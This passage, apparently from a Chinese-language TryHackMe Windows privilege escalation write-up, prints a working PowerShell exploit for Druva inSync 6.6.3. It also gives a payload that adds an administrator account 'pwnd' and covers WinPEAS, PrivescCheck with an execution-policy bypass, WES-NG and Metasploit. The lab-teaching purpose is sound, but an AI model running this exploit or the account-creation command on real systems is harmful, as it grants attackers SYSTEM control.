name,version,vendor</span><br></pre></td></tr></table></figure><p>该命令会列出所有已安装软件的名称（<code>name</code>）、版本号（<code>version</code>）以及供应商（<code>vendor</code>）。<strong>执行可能需要一分钟左右</strong>，因为它会遍历注册表项和 WMI 数据库，收集相关信息。</p><p>如果你在列出的软件中发现了过时的或有漏洞的版本，可以进一步查找是否存在已知的漏洞利用方式，例如本地提权漏洞（LPE, Local Privilege Escalation）。</p><p>请记住，<code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或通常表明存在可能易受攻击的其他软件的任何痕迹总是值得的。</p><h4 id="案例研究：Druva-inSync-6-6-3"><a href="#案例研究：Druva-inSync-6-6-3" class="headerlink" title="案例研究：Druva inSync 6.6.3"></a>案例研究：Druva inSync 6.6.3</h4><p>目标服务器正在运行 Druva inSync 6.6.3，据 <a href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a> 报告，该服务器容易受到权限提升的影响。该漏洞是由于对 <a href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a> 最初报告的版本 6.5.0 的另一个漏洞应用了错误补丁造成的。</p><p>该软件容易受到攻击，因为它在端口 6064 上运行具有 SYSTEM 权限的 RPC（远程过程调用）服务器，只能从 localhost 访问。如果您不熟悉 RPC，它只是一种机制，它允许给定进程通过网络公开函数（在 RPC 术语中称为过程），以便其他计算机可以远程调用它们。</p><p>在 Druva inSync 的情况下，端口 6064 上公开的程序之一（特别是程序编号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p><p>版本 6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能背后的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，没有进行检查以确保这一点。</p><p>发布了一个补丁，他们决定检查执行的命令是否以字符串 <code>C：\ProgramData\Druva\inSync4\</code> 开头，允许的二进制文件应该在其中。但后来证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C：\Windows\System32\cmd.exe</code>，它不在允许的路径中;您可以简单地要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> ，这将成功绕过检查。</p><p>要整合一个有效的漏洞利用，我们需要了解如何与端口 6064 通信。幸运的是，使用的协议很简单，要发送的数据包如下图所示：</p><p><img src="/../imgs/$%7Bfiilename%7D/ff706d6530426d3123c0983acd61f934.png" alt="Druva Exploit Diagram"></p><p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表示我们想要执行第 5 个过程，因为这是易受攻击的过程，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p><p>最初由 Matteo Malvica <a href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">在此处</a>发布，以下漏洞可在您的目标计算机中用于提升权限并检索此任务的标志。为方便起见，以下是原始漏洞利用程序的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ErrorActionPreference = &quot;Stop&quot;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;net user pwnd /add&quot;</span><br><span class="line"></span><br><span class="line">$s = New-Object System.Net.Sockets.Socket(</span><br><span class="line">    [System.Net.Sockets.AddressFamily]::InterNetwork,</span><br><span class="line">    [System.Net.Sockets.SocketType]::Stream,</span><br><span class="line">    [System.Net.Sockets.ProtocolType]::Tcp</span><br><span class="line">)</span><br><span class="line">$s.Connect(&quot;127.0.0.1&quot;, 6064)</span><br><span class="line"></span><br><span class="line">$header = [System.Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)</span><br><span class="line">$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)</span><br><span class="line">$command = [System.Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;);</span><br><span class="line">$length = [System.BitConverter]::GetBytes($command.Length);</span><br><span class="line"></span><br><span class="line">$s.Send($header)</span><br><span class="line">$s.Send($rpcType)</span><br><span class="line">$s.Send($length)</span><br><span class="line">$s.Send($command)</span><br></pre></td></tr></table></figure><p>您可以弹出 Powershell 控制台并直接粘贴漏洞以执行它（该漏洞也可以在目标计算机 <code>C:\tools\Druva_inSync_exploit.txt</code> 中找到）。请注意，在 <code>$cmd</code> 变量中指定的漏洞利用的默认有效负载将在系统中创建一个名为 <code>pwnd</code> 的用户，但不会为他分配管理权限，因此我们可能希望将有效负载更改为更有用的内容。对于此 room，我们将更改 payload 以运行以下命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span><br></pre></td></tr></table></figure><p>这将创建密码为 <code>SimplePass123</code> 的用户 <code>pwnd</code> 并将其添加到管理员组。如果漏洞利用成功，您应该能够运行以下命令来验证用户 <code>pwnd</code> 是否存在并且是管理员组的一部分：</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250320182713906.png" alt="image-20250320182713906"></p><h3 id="Tools-of-the-Trade-发现工具"><a href="#Tools-of-the-Trade-发现工具" class="headerlink" title="Tools of the Trade 发现工具"></a>Tools of the Trade 发现工具</h3><h4 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具下载:</span><br><span class="line">curl -L -o winPEAS.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</span><br></pre></td></tr></table></figure><p><strong>WinPEAS（Windows Privilege Escalation Awesome Scripts）</strong> 是一个<strong>自动化枚举工具</strong>，用于<strong>查找 Windows 目标系统中的潜在权限提升向量</strong>。它会执行一系列检查，寻找可能的漏洞或错误配置，从而帮助攻击者或渗透测试人员找到可以利用的安全问题。</p><p><strong>如何使用 WinPEAS</strong></p><ol><li><p><strong>下载 WinPEAS</strong> 你可以从 GitHub 获取 WinPEAS：</p><ul><li><p>GitHub 主页：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p></li><li><p>直接下载可执行文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>在目标系统上执行 WinPEAS</strong> 由于 WinPEAS 输出可能<strong>非常冗长</strong>，建议将结果保存到文件中，以便后续分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winPEASx64.exe &gt; output.txt</span><br></pre></td></tr></table></figure><p>或者，如果你使用的是 <strong>PowerShell</strong>，可以运行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\winPEASx64.exe | Tee-Object -FilePath output.txt</span><br></pre></td></tr></table></figure></li></ol><hr><p><strong>WinPEAS 枚举的关键信息</strong></p><p>WinPEAS 主要关注以下几个方面：</p><p><strong>1. 系统信息</strong></p><ul><li>Windows 版本</li><li>内核版本</li><li>计算机名称</li><li>当前用户及权限</li></ul><p><strong>2. 用户和组</strong></p><ul><li>当前用户属于哪些本地组</li><li>是否有 <code>SeImpersonatePrivilege</code>（可能导致 <code>Juicy Potato</code> 攻击）</li><li>是否属于 <code>Administrators</code> 组</li></ul><p><strong>3. 运行进程</strong></p><ul><li>以高权限运行的进程</li><li>进程是否加载了<strong>可写入的 DLL</strong>（DLL 劫持）</li></ul><p><strong>4. 服务</strong></p><ul><li>是否有<strong>可写的 Windows 服务</strong></li><li>是否有<strong>自动运行的高权限服务</strong></li></ul><p><strong>5. 注册表</strong></p><ul><li>是否存在存储密码的注册表项</li><li>是否有 <code>AlwaysInstallElevated</code>（可用于安装 SYSTEM 权限的 MSI）</li></ul><p><strong>6. 计划任务</strong></p><ul><li>是否有可写的计划任务（可用于执行 SYSTEM 级 payload）</li></ul><p><strong>7. 可执行文件</strong></p><ul><li>是否有可写入的 <code>C:\Program Files</code> 目录</li><li>是否有 <code>Unquoted Service Path</code>（未加引号的服务路径漏洞）</li></ul><p><strong>8. 其他漏洞</strong></p><ul><li>是否存在<strong>已知的可利用漏洞</strong></li><li>是否安装了<strong>过时或易受攻击的软件</strong></li><li>是否存在<strong>可写的 <code>schtasks</code> 任务</strong></li></ul><hr><p><strong>分析 WinPEAS 输出</strong></p><p>WinPEAS 生成的输出可能很长，但你可以使用以下关键字快速定位可能的漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /i &quot;Privilege Service Writable User Vulnerable&quot; output.txt</span><br></pre></td></tr></table></figure><p>或者使用 PowerShell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select-String -Path output.txt -Pattern &quot;Privilege|Service|Writable|User|Vulnerable&quot;</span><br></pre></td></tr></table></figure><p>运行 <code>winPEASx64.exe</code> 可能会发现类似以下的结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Modifiable Service</span><br><span class="line">    [?] Service Name: VulnerableService</span><br><span class="line">    Path: C:\Program Files\VulnerableApp\service.exe</span><br><span class="line">    StartType: Auto</span><br><span class="line">    User: LocalSystem</span><br></pre></td></tr></table></figure><p>这表明 <code>VulnerableService</code> 以 <strong>SYSTEM 权限</strong> 运行，并且路径可修改，意味着可以替换 <code>service.exe</code>，从而获取 SYSTEM 访问权限。</p><p><strong>其他 Privilege Escalation 工具</strong></p><p>除了 WinPEAS，以下工具也常用于 Windows 权限提升检查：</p><ul><li><strong>PowerUp</strong>（适用于 PowerShell）</li><li><strong>Seatbelt</strong>（C# 版本的权限提升枚举）</li><li><strong>SharpUp</strong>（用于 .NET 环境）</li><li><strong>Windows Exploit Suggester</strong>（检查已知漏洞）</li></ul><p>工具:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/peass-ng/PEASS-ng/releases/latest/</span><br></pre></td></tr></table></figure><p>当然不只是win可以使用着一些相关工具还有linux</p><p>实践</p><p>win:</p><p>直接在攻击机上开一个smb把 WinPEAS传到目标机上即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250320222935478.png" alt="image-20250320222935478"></p><p>net use Z: \192.168.106.128\public &#x2F;user:1 1或则</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250320223002426.png" alt="image-20250320223002426"></p><p>linux:</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250320224347438.png" alt="image-20250320224347438"></p><p>PEASS-ng 支持将检测的导出结果转换为 json、html、pdf 等格式的报告。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">项目地址：https://github.com/mnemonic-re/parsePEASS/tree/Scripts/parsePEASS/parsers</span><br></pre></td></tr></table></figure><p>首先将 PEASS-ng 的检测结果导出到文件中，可以使用如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux/Unix*/MacOS环境：</span><br><span class="line">    ./linpeas.sh &gt; result.txt</span><br><span class="line">Windows环境：</span><br><span class="line">    winPEAS.bat &gt; result.txt</span><br><span class="line">    winPEASany.exe log=result.txt</span><br><span class="line">然后使用 peas2json.py 将检测结果导出的文件转化为 json 格式文件。</span><br><span class="line">python3 peas2json.py result.txt peass.json</span><br><span class="line">最后将 json 格式文件转化为 html 或者 pdf 格式报告。</span><br><span class="line">python3 json2html.py peass.json peass.html</span><br><span class="line">python3 json2pdf.py peass.json peass.pdf</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PrivescCheck-钥匙链检查"><a href="#PrivescCheck-钥匙链检查" class="headerlink" title="PrivescCheck 钥匙链检查"></a>PrivescCheck 钥匙链检查</h4><p>PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限提升。它提供了 WinPEAS 的替代方案，而无需执行二进制文件。</p><p>PrivescCheck 可以<a href="https://github.com/itm4n/PrivescCheck">在这里</a>下载。</p><p><strong>提醒</strong>：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">. .\PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object &quot;C:\Temp\result.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250321173821025.png" alt="image-20250321173821025"></p><h4 id="ES-NG：Windows-漏洞利用建议器-下一代"><a href="#ES-NG：Windows-漏洞利用建议器-下一代" class="headerlink" title="ES-NG：Windows 漏洞利用建议器 - 下一代"></a>ES-NG：Windows 漏洞利用建议器 - 下一代</h4><p>一些漏洞利用建议脚本（例如 winPEAS）会要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为避免发出不必要的噪音而引起注意，您可能更喜欢使用 WES-NG，它将在您的攻击机器（例如 Kali 或 TryHackMe AttackBox）上运行。WES-NG 是一个 Python 脚本，可以<a href="https://github.com/bitsadmin/wesng">在此处</a>找到和下载</p><p>安装后，在使用之前，键入 <code>wes.py --update</code> 命令以更新数据库。该脚本将引用它创建的数据库，以检查是否存在缺失的补丁，这些补丁可能会导致漏洞，您可以使用它来提升目标系统上的权限。</p><p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击机器的 .txt 文件。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250321182257778.png" alt="image-20250321182257778"></p><p>在攻击机开个smb服务</p><p>把txt文件传到攻击机即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183547761.png" alt="image-20250321183547761"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183601388.png" alt="image-20250321183601388"></p><p>完成此作后，wes.py 可以按如下方式运行;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wes.py systeminfo.txt</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183617871.png" alt="image-20250321183617871"></p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>如果您在目标系统上已经有 Meterpreter shell，则可以使用该 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞，并允许您提升在目标系统上的权限。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
